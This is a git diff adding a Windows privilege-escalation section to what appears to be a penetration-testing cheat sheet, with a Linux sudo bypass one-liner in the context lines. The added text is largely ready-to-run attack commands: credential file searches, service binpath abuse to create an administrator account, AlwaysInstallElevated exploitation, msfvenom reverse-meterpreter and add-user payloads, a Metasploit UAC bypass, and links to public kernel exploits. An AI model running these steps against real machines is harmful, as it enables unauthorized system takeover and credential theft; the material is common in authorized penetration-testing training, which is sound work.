@@ -220,6 +220,266 @@ GTFO Bins (https://gtfobins.github.io/)
 **If Vulnerable to CVE-2019-14287 and has sudo permissions use:**
      	
 		sudo -u#-1 /bin/bash
+## Windows PrivEsc
+
+**Gather Info:**
+
+	To gather system information:
+
+	systeminfo
+
+	To check the OS version:
+
+	systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+	To check active network connections:
+
+	netstat -ano
+
+	To check for firewall settings:
+
+	netsh firewall show state
+
+	netsh firewall show config
+
+	Use the following command to check the scheduled tasks:
+
+	schtasks /query /fo LIST /v
+
+	To check running processes linked to services:
+
+	tasklist /SVC
+
+	To check for running services:
+
+	net start
+
+	To check for installed drivers:
+
+	DRIVERQUERY
+
+	With the following command you can check for installed patches:
+
+	wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+	Search for interesting files names.
+
+	The following command searches the system for files that contain ‘password’ in the filename:
+
+	dir /s *password*
+	
+	You can also search file contents for specific keywords, such as the password. The following command searches for the keyword ‘password’ in files with the .txt extension:
+
+	findstr /si password *.txt
+	
+**Search for Unquoted Service Paths:**
+
+	wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+	
+	sc qc [service name]
+	
+	icacls [Directory]
+	
+	icacls "C:\Program Files\Program"
+	
+	Create a reverse shell payload:
+	msfvenom -p windows/meterpreter/reverse_tcp -e LHOST=[LHOST IP] LPORT=443 -f exe -o Some.exe
+	
+	sc stop [service name]
+	sc start [service name]
+	
+**Modifying the binary service path:**
+
+	To display services that can be modified by an authenticated user type:
+
+	accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+
+	A service with write permissions for an authenticated user will look like the following:
+
+	RW [service name] SERVICE_ALL_ACCESS
+
+	Use this command to show the service properties:
+
+	sc qc [service name]
+
+	In order to exploit this misconfiguration, we have to change the BINARY_PATH_NAME on the service and change it to a malicious executable which can be done using these commands:
+
+	sc config [service name] binpath= "malicious executable path"
+
+	sc stop [service name]
+
+	sc start [service name]
+
+	We can also use the binary path to add a new user and grant administrator rights:
+
+	sc config [service name] binpath= "net user admin password /add"
+
+	sc stop [service name]
+
+	sc start [service name]
+
+	sc config [service name] binpath= "net localgroup Administrators admin /add"
+
+	sc stop [service name]
+
+	sc start [service name]
+
+	Metasploit Module to exploit this vulnerability with Metasploit: exploit/windows/local/service_permissions
+	
+**AlwaysInstallElevated Setting:**
+
+	You can check the values of these registry keys using the following commands:
+
+	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+	When the AlwaysInstallElevated is enabled in the registry entries we can use MSFVenom to create a payload. Use the following command to generate and add user payload:
+
+	msfvenom -p windows/adduser USER=admin PASS=password -f msi -o filename.msi
+
+	Instead of having the payload generate a new user on the system we can also create a reverse shell payload with the following command:
+
+	msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=[LHOST IP] LPORT=443 -f msi -o filename.msi
+
+	Finally, run the following command on the target system to execute the msi installer file:
+
+	msiexec /quiet /qn /i C:\Users\filename.msi
+
+	Let’s explain the different flags that we’ve used in this command:
+
+    		The /quiet flag will bypass UAC.
+    		The /qn flag specifies to not use a GUI.
+    		The /i flag is to perform a regular installation of the referenced package.
+
+	The command will execute the malicious payload and add an administrator user to the system or trigger a reverse shell with system privileges back to the attack box.
+
+	To exploit this vulnerability with Metasploit you can use the following Metasploit Module: exploit/windows/local/always_install_elevated
+	
+**Unattended Install Files:**
+
+
+    C:\Windows\Panther\
+    C:\Windows\Panther\Unattend\
+    C:\Windows\System32\
+    C:\Windows\System32\sysprep\
+
+
+    Unattend.xml
+    unattended.xml
+    unattend.txt
+    sysprep.xml
+    sysprep.inf
+**Bypassing UAC with Metaploit:**
+
+	Use "background" to background your meterpreter shell.
+	Then, to set the UAC bypass module in Metasploit type:
+
+	use exploit/windows/local/bypassuac
+
+	Next you set the session ID and the listening host IP and run the exploit with:
+
+	set session [Session ID]
+
+	set lhost [VPN IP]
+
+	run
+	
+	getsystem
+	
+**Windows Exploit Suggester:**
+
+	Coming Soon
+	
+**WMI Hotfixes:**
+
+	Coming Soon
+	
+**WinPEAS:**
+
+	See: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+	
+**Other Scripts & Tools:
+
+	Common Exploits
+
+	These next exploits are common privilege escalation exploits for Windows and worth trying if you come across matching operating systems.
+	Windows Vista/7 – Elevation of Privileges (UAC Bypass)
+
+	https://www.exploit-db.com/exploits/15609/
+
+	This exploit applies to:
+
+    		Windows Vista/2008 6.1.6000 x32,
+   		Windows Vista/2008 6.1.6001 x32,
+    		Windows 7 6.2.7600 x32,
+    		Windows 7/2008 R2 6.2.7600 x64.
+
+	Microsoft Windows 7 SP1 (x86) – ‘WebDAV’ Privilege Escalation (MS16-016)
+
+	https://www.exploit-db.com/exploits/39432/
+
+	And here’s a pre-compiled version that pops a system shell within the same session instead of in a new window:
+
+	https://www.exploit-db.com/exploits/39788/
+
+	This applies to:
+
+    		Windows 7 SP1 x86 (build 7601)
+
+	Microsoft Windows 7 SP1 (x86) – Privilege Escalation (MS16-014)
+
+	https://www.exploit-db.com/exploits/40039/
+
+	This applies to:
+
+    		Windows 7 SP1 x86
+	
+	Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) – Privilege Escalation (MS16-032)
+
+	https://www.exploit-db.com/exploits/39719/
+
+	This applies to:
+
+    		Windows 7 x86/x64
+    		Windows 8 x86/x64
+    		Windows 10
+    		Windows Server 2008-2012R2
+
+	CVE-2017-0213: Windows COM Elevation of Privilege Vulnerability
+
+	https://www.exploit-db.com/exploits/42020/
+
+	This applies to:
+
+    		Windows 10 (1511/10586, 1607/14393 & 1703/15063)
+    		Windows 7 SP1 x86/x64
+
+	Precompiled exploits:
+
+	https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213
+
+	https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213
+	CVE-2019-1253: Windows Elevation of Privilege Vulnerability
+
+	This vulnerability applies to:
+
+    		Windows 10 (all versions) that are not patched with September (2019) update
+
+	https://github.com/padovah4ck/CVE-2019-1253
+	CVE-2019-0836: Microsoft Windows 10 1809
+
+	This vulnerability applies to:
+
+    		Windows 10 (1607,1703, 1709, 1803, 1809)
+    		Windows 7 and Windows 8.1
+    		Windows server 2008 (R2), 2012 (R2), 2016 (Server Core) and 2019 (Server Core)
+
+	https://www.exploit-db.com/exploits/46718
+
+	https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0836
+
+	https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-0836
 
 ## Generate Password Hash:
 
